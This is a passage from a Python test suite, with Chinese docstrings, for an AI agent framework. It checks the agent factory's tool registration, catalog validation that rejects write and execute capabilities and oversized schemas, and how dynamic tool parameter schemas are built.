            assert deps.dynamic_tools[0]["name"] == "my_skill.tool1"


# ---------------------------------------------------------------------------
# B093 Finding 1: Session-scoped Agent factory tests
# ---------------------------------------------------------------------------

class TestSessionAgentFactory:
    """测试 build_session_agent factory。"""

    def _tool_names(self, agent):
        return set(agent._function_toolset.tools.keys())

    def test_factory_creates_agent_with_builtins(self):
        agent = build_session_agent()
        names = self._tool_names(agent)
        assert "_tool_execute_command" in names
        assert "_tool_ask_user" in names
        assert "_tool_lookup_knowledge" in names

    def test_factory_without_lookup_knowledge(self):
        agent = build_session_agent(include_lookup_knowledge=False)
        names = self._tool_names(agent)
        assert "_tool_lookup_knowledge" not in names

    def test_factory_registers_dynamic_tools(self):
        tools = [
            {"name": "my_skill.read_file", "description": "读取文件"},
            {"name": "my_skill.list_dir", "description": "列出目录"},
        ]
        agent = build_session_agent(dynamic_tools=tools)
        names = self._tool_names(agent)
        assert "my_skill.read_file" in names
        assert "my_skill.list_dir" in names

    def test_factory_creates_independent_instances(self):
        """每次调用应创建独立 Agent 实例。"""
        agent1 = build_session_agent(dynamic_tools=[
            {"name": "skill_a.tool", "description": "A"},
        ])
        agent2 = build_session_agent(dynamic_tools=[
            {"name": "skill_b.tool", "description": "B"},
        ])
        names1 = self._tool_names(agent1)
        names2 = self._tool_names(agent2)
        assert "skill_a.tool" in names1
        assert "skill_a.tool" not in names2
        assert "skill_b.tool" in names2
        assert "skill_b.tool" not in names1


# ---------------------------------------------------------------------------
# B093 Finding 2: validate_tool_catalog tests
# ---------------------------------------------------------------------------

class TestValidateToolCatalog:
    """测试 validate_tool_catalog 校验。"""

    def test_valid_tools_pass(self):
        tools = [
            {"name": "my_skill.read", "kind": "dynamic", "skill": "my_skill",
             "description": "读取", "parameters": {"type": "object", "properties": {}}},
            {"name": "my_skill.list", "kind": "dynamic", "skill": "my_skill",
             "description": "列表", "parameters": {"type": "object", "properties": {}}},
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == 2

    def test_reject_non_namespaced_dynamic_tool(self):
        tools = [
            {"name": "bad_tool", "kind": "dynamic", "description": "无命名空间"},
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == 0

    def test_reject_forbidden_capability(self):
        tools = [
            {"name": "my_skill.exec", "kind": "dynamic", "skill": "my_skill",
             "capability": "execute", "description": "执行",
             "parameters": {"type": "object", "properties": {}}},
            {"name": "my_skill.write", "kind": "dynamic", "skill": "my_skill",
             "capability": "write", "description": "写入",
             "parameters": {"type": "object", "properties": {}}},
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == 0

    def test_allow_read_only_capability(self):
        tools = [
            {"name": "my_tool.read", "kind": "dynamic", "skill": "my_tool",
             "capability": "read_only", "description": "读取",
             "parameters": {"type": "object", "properties": {}}},
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == 1

    def test_allow_info_only_capability(self):
        tools = [
            {"name": "my_tool.info", "kind": "dynamic", "skill": "my_tool",
             "capability": "info_only", "description": "信息",
             "parameters": {"type": "object", "properties": {}}},
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == 1

    def test_truncate_long_description(self):
        tools = [
            {"name": "my_tool.x", "kind": "dynamic", "skill": "my_tool",
             "description": "x" * 600,
             "parameters": {"type": "object", "properties": {}}},
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == 1
        assert len(result[0]["description"]) == MAX_DESCRIPTION_LENGTH

    def test_reject_oversized_schema(self):
        tools = [
            {"name": "my_tool.big", "kind": "dynamic", "skill": "my_tool",
             "description": "大schema",
             "parameters": {"properties": {f"field_{i}": {"type": "string"} for i in range(500)}}},
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == 0

    def test_max_tools_limit(self):
        tools = [
            {"name": f"s{i}.tool", "kind": "dynamic", "skill": f"s{i}",
             "description": f"tool {i}",
             "parameters": {"type": "object", "properties": {}}}
            for i in range(MAX_TOOLS_PER_SNAPSHOT + 5)
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == MAX_TOOLS_PER_SNAPSHOT

    def test_builtin_tools_skip_namespace_check(self):
        tools = [
            {"name": "execute_command", "kind": "builtin", "description": "内置",
             "parameters": {"type": "object", "properties": {}}},
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == 1

    def test_reject_builtin_without_parameters(self):
        """builtin 工具缺少 parameters 也应被拒绝。"""
        tools = [
            {"name": "execute_command", "kind": "builtin", "description": "内置"},
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == 0

    def test_invalid_parameters_type_rejected(self):
        tools = [
            {"name": "my_tool.bad", "kind": "dynamic", "skill": "my_tool",
             "description": "坏参数", "parameters": "not a dict"},
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == 0

    def test_reject_dynamic_tool_without_skill(self):
        """dynamic 工具缺少 skill 字段应被拒绝。"""
        tools = [
            {"name": "my_tool.read", "kind": "dynamic", "description": "读取",
             "parameters": {"type": "object", "properties": {}}},
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == 0

    def test_reject_dynamic_tool_without_parameters(self):
        """dynamic 工具缺少 parameters 应被拒绝。"""
        tools = [
            {"name": "my_tool.read", "kind": "dynamic", "skill": "my_tool",
             "description": "读取"},
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == 0

    def test_reject_dynamic_tool_invalid_json_schema(self):
        """dynamic 工具 parameters 不含 type/properties/$schema 应被拒绝。"""
        tools = [
            {"name": "my_tool.read", "kind": "dynamic", "skill": "my_tool",
             "description": "读取", "parameters": {"random_key": "value"}},
        ]
        result = validate_tool_catalog(tools)
        assert len(result) == 0


# ---------------------------------------------------------------------------
# B093 Finding 3: lookup_knowledge gating test
# ---------------------------------------------------------------------------

class TestLookupKnowledgeGating:
    """测试 lookup_knowledge 版本门控。"""

    @pytest.mark.asyncio
    async def test_run_agent_without_lookup_knowledge(self):
        """include_lookup_knowledge=False 时不应注册 lookup_knowledge。"""
        with patch('pydantic_ai.Agent.run', new_callable=AsyncMock) as mock_run:
            mock_run.return_value = MagicMock(
                output=AgentResult(summary="test", steps=[], need_confirm=False),
                usage=MagicMock(input_tokens=0, output_tokens=0, total_tokens=0, requests=1),
            )
            await run_agent(
                intent="test",
                session_id="s1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
                include_lookup_knowledge=False,
            )
            mock_run.assert_awaited_once()


# ---------------------------------------------------------------------------
# B093 Finding 2 补充: snapshot 256KB 边界测试
# ---------------------------------------------------------------------------

class TestValidateToolCatalogSnapshotBoundary:
    """测试 validate_tool_catalog snapshot 级边界。"""

    def test_reject_oversized_snapshot(self):
        """整个 snapshot 超过 256KB 时拒绝。"""
        import json
        large_tools = [
            {"name": f"s{i}.tool", "kind": "dynamic", "skill": f"s{i}",
             "description": "x" * 5000,
             "parameters": {"type": "object", "properties": {}}}
            for i in range(60)
        ]
        assert len(json.dumps(large_tools).encode("utf-8")) > 256 * 1024
        result = validate_tool_catalog(large_tools)
        assert result == []

    def test_reject_multibyte_oversized_snapshot(self):
        """UTF-8 bytes 校验：确保用 bytes 而非字符数判断 snapshot 大小。"""
        import json
        # 大量中文描述，json.dumps 默认转义为 \uXXXX 使 bytes > 256KB
        tools = [{"name": f"s{i}.tool", "kind": "dynamic", "skill": f"s{i}",
                  "description": "中文描述" * 2000,
                  "parameters": {"type": "object", "properties": {}}} for i in range(30)]
        raw = json.dumps(tools)
        assert len(raw.encode("utf-8")) > 256 * 1024
        result = validate_tool_catalog(tools)
        assert result == []

    def test_accept_within_snapshot_limit(self):
        """snapshot 在 256KB 内正常通过。"""
        small_tools = [
            {"name": "s1.tool", "kind": "dynamic", "skill": "s1",
             "description": "小工具", "parameters": {"type": "object", "properties": {}}},
        ]
        result = validate_tool_catalog(small_tools)
        assert len(result) == 1


# ---------------------------------------------------------------------------
# B093 Finding 2 补充: _register_dynamic_tool 参数 schema 描述测试
# ---------------------------------------------------------------------------

class TestDynamicToolParameterSchema:
    """测试动态工具参数 schema 注册到 Pydantic AI 签名。"""

    def test_parameters_registered_as_pydantic_model(self):
        """有 parameters 时应创建动态 Pydantic model，注册到工具签名中。"""
        agent = build_session_agent(dynamic_tools=[
            {"name": "my_skill.read_file", "description": "读取文件",
             "parameters": {
                 "type": "object",
                 "properties": {"path": {"type": "string"}},
                 "required": ["path"],
             }},
        ])
        tool_obj = agent._function_toolset.tools["my_skill.read_file"]
        json_schema = tool_obj.function_schema.json_schema
        # path 应作为顶层参数
        assert "path" in json_schema.get("properties", {})
        assert "path" in json_schema.get("required", [])

    def test_no_properties_falls_back_to_dict(self):
        """parameters 无 properties 时使用 dict fallback。"""
        agent = build_session_agent(dynamic_tools=[
            {"name": "my_skill.tool", "description": "简单工具",
             "parameters": {"type": "object"}},
        ])
        tool_obj = agent._function_toolset.tools["my_skill.tool"]
        json_schema = tool_obj.function_schema.json_schema
        # fallback: arguments 是 generic object
        args_schema = json_schema.get("properties", {}).get("arguments", {})
        assert args_schema.get("type") == "object"

    def test_optional_parameter_defaults_to_none(self):
        """可选参数（不在 required 中）默认值应为 None。"""
        agent = build_session_agent(dynamic_tools=[
            {"name": "my_skill.search", "description": "搜索",
             "parameters": {
                 "type": "object",
                 "properties": {
                     "query": {"type": "string"},
                     "limit": {"type": "integer"},
                 },
                 "required": ["query"],
             }},
        ])
        tool_obj = agent._function_toolset.tools["my_skill.search"]
        json_schema = tool_obj.function_schema.json_schema
        props = json_schema.get("properties", {})
        assert "query" in props
        assert "limit" in props
        # query 应在 required 中，limit 不在
        assert "query" in json_schema.get("required", [])
        assert "limit" not in json_schema.get("required", [])
